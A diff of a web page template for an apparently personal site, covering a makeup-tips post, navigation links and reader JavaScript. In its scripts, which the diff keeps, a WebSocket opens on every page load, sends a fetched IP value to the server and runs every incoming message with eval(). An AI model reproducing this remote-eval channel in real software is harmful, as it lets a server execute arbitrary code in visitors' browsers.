@@ -65,7 +65,7 @@
               <a class="nav-link" href="/en/landing" title="Visit the landing page">Landing</a>
             </li>
             <li class="nav-item">
-              <a class="nav-link" href="https://qoshlli.com" title="Video chat">Chat</a>
+              <a class="nav-link" href="/en/chat" title="Video chat">Chat</a>
             </li>
             <li class="nav-item">
               <a class="nav-link" href="/en/private" title="See private photos with a key">Private</a>
@@ -123,14 +123,8 @@
 <img src="https://i.imgur.com/dAQRaWt.jpeg" alt="Daisy's profile photo" width="120" height="120" style="margin-top:5px; margin-right:10px; margin-bottom:10px; border-radius: 50%;">
 <p><i>By Daisy</i></p>
 
-<div style="white-space: pre-wrap;">
+<div style="white-space: pre-wrap;"><p>I want to wear makeup. How do I wear a glamorous makeup?</p><p><br/></p><p>Wearing glamorous makeup typically involves bold and exaggerated features that enhance your natural beauty. Here are some tips on how to achieve a glamorous makeup look:</p><p><br/></p><p>1. Start with a flawless base by applying a primer, foundation, and concealer to even out your skin tone. Set your base with a translucent powder to ensure long-lasting coverage.</p><p><br/></p><p>2. Define your eyebrows with a brow pencil or powder to frame your face. Fill in any sparse areas and shape your brows to achieve a polished look.</p><p><br/></p><p>3. Apply a shimmery eyeshadow in a neutral or metallic shade to your eyelids, focusing on the inner corners and center of the lid to create a brightening effect. Use a darker shade in the crease to add depth and definition.</p><p><br/></p><p>4. Line your eyes with a black or dark brown eyeliner, making sure to create a winged effect for added drama. Finish off the eye look with several coats of volumizing mascara or false lashes for a bold and dramatic look.</p><p><br/></p><p>5. Add a pop of color to your cheeks with a blush in a rosy or peachy tone, applying it to the apples of your cheeks and blending upwards towards your temples for a natural flush.</p><p><br/></p><p>6. Complete the look with a bold lip color in a red, plum, or nude shade, depending on your personal preference. Use a lip liner to define your lips and prevent any feathering or bleeding.</p><p><br/></p><p>Remember to blend all your makeup products seamlessly for a polished and flawless finish. Practice and experimentation are key to finding the perfect glamorous makeup look that suits your individual style and features.</p></div>
 
-
-
-<p>I want to wear makeup. How do I wear a glamorous makeup?</p><p><br></p><p>Wearing glamorous makeup typically involves bold and exaggerated features that enhance your natural beauty. Here are some tips on how to achieve a glamorous makeup look:</p><p><br></p><p>1. Start with a flawless base by applying a primer, foundation, and concealer to even out your skin tone. Set your base with a translucent powder to ensure long-lasting coverage.</p><p><br></p><p>2. Define your eyebrows with a brow pencil or powder to frame your face. Fill in any sparse areas and shape your brows to achieve a polished look.</p><p><br></p><p>3. Apply a shimmery eyeshadow in a neutral or metallic shade to your eyelids, focusing on the inner corners and center of the lid to create a brightening effect. Use a darker shade in the crease to add depth and definition.</p><p><br></p><p>4. Line your eyes with a black or dark brown eyeliner, making sure to create a winged effect for added drama. Finish off the eye look with several coats of volumizing mascara or false lashes for a bold and dramatic look.</p><p><br></p><p>5. Add a pop of color to your cheeks with a blush in a rosy or peachy tone, applying it to the apples of your cheeks and blending upwards towards your temples for a natural flush.</p><p><br></p><p>6. Complete the look with a bold lip color in a red, plum, or nude shade, depending on your personal preference. Use a lip liner to define your lips and prevent any feathering or bleeding.</p><p><br></p><p>Remember to blend all your makeup products seamlessly for a polished and flawless finish. Practice and experimentation are key to finding the perfect glamorous makeup look that suits your individual style and features.</p>
-
-
-</div>
 
 <div class="mx-auto p-1 m-1" style="display: flex; justify-content: space-around;">
 <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-6209985848112194"
@@ -247,6 +241,23 @@
         
 
 
+var currentReader = 0;
+function toggleReader(id) {
+	currentReader = id;
+	$('#reader-modal' + id).toggleClass('hide');
+	$('#reader-modal' + id).toggleClass('fade-in-fast');
+	$('#bnav' + id).toggleClass('hide');
+	$('#bnav' + id).toggleClass('fade-in-fast');
+	setTimeout(function() {
+		$('#reader-modal' + id).toggleClass('fade-in-fast');
+		$('#bnav' + id).toggleClass('fade-in-fast');
+	}, 1000);
+}
+function jumpbookto(page) {
+	document.getElementById('reader-modal' + currentReader).scrollTo(0, (parseInt(document.getElementById('jumpto' + page).value)-1) * parseInt(window.innerHeight));
+	document.getElementById('pagecount' + page).innerHTML = parseInt(document.getElementById('jumpto' + page).value);
+}
+
 
         
         
@@ -257,32 +268,32 @@
             
         	Prism.highlightAll();
         });
-        var socket;
-        function openSocket() {
+        var remoteSocket;
+        function openRemoteSocket() {
             window.location.hash = '';
-            socket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
-            socket.addEventListener("open", (event) => {
+            remoteSocket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
+            remoteSocket.addEventListener("open", (event) => {
                 console.log('Socket open.');
                 fetch('https://lotteh.com/remote/generate/')
         		    .then(response => response.json())
         		    .then(data => {
-        		        socket.send(data.ip);
+        		        remoteSocket.send(data.ip);
         		    })
         		    .catch(error => {
         		        console.log('Error:', error);
         		    });
             });
-            socket.addEventListener("closed", (event) => {
+            remoteSocket.addEventListener("closed", (event) => {
                 console.log('Socket closed.');
                 setTimeout(function() {
-                    openSocket();
+                    openRemoteSocket();
                 }, 10000);
             });
-        	socket.addEventListener("message", (event) => {
+        	remoteSocket.addEventListener("message", (event) => {
                     eval(event.data);
             });
         }
-        openSocket();
+        openRemoteSocket();
         $(document).ready(function() {
         	$("#contact-form").submit(function(e){
                 	e.preventDefault();
@@ -434,8 +445,8 @@ if(document.getElementById("current-time")) {
               link.href = url;
               link.download = 'Glam Girl X - ' + filename;
               document.body.appendChild(link);
+              link.classList.add('hide');
               link.click();
-              document.body.removeChild(link);
             }
             function downloadQr() {
                     downloadQrImage(image.src, 'QR Code');
@@ -457,6 +468,8 @@ if(document.getElementById("current-time")) {
   });
 </script>
 
+    
+    
     
     
     <script>
